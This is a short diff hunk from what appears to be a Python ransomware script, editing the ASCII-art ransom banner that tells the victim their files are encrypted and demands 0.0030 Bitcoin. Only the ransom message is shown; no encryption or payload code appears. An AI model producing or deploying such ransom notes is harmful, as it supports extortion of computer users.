@@ -74,7 +74,7 @@ print(f"""
                                               __/ |  
                                              |___/   
              ___________________________________
-            [You're Computer has been fucked lol]                                           
+            [You're Computer has been hacked lol]                                           
             [Your files are Encrypted hahaha cry]              
             [So, if you feel like getting your  ]
             [files back send me [0.0030 BITCOIN]]
